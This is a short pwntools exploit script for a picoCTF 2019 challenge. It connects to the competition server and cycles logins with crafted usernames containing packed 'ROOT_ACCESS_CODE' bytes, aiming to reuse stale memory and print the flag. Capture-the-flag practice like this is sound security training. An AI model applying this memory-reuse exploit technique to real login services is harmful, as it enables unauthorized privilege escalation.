#! /usr/bin/env python2

from pwn import *

context.log_level = logging.CRITICAL

def login(username):
    p.sendline('login')
    p.recvuntil('of your username\n')
    p.sendline(str(len(username)))
    p.recvuntil('enter your username\n')
    p.sendline(username)
    p.recvuntil('command:\n')

def logout():
    p.sendline('logout')
    p.recvuntil('command:\n')

def printflag():
    p.sendline('print-flag')
    p.recvuntil('Enter your command:\n[aaaaaaaaROOT_ACCESS_CODE]> ')
    print("Flag: " + p.recvuntil('}'))


# ok so i literally have no idea whats happening here but it works so heck who am i to complain

print("hacc in progress\n(usually takes up to 30 seconds)")

p = remote("2019shell1.picoctf.com", 37919)

hacc = ('a'*8) + ((p64(0x4343415f544f4f52) + p64(0x45444f435f535345)) * 4)

for i in range(1, 26):
    login('aa' + p64(0x4343415f544f4f52) + p64(0x45444f435f535345))
    logout()
    login(hacc[0:i])
    logout()

login('aa' + p64(0x4343415f544f4f52) + p64(0x45444f435f535345))
logout()
login(hacc[0:i])
printflag()
logout()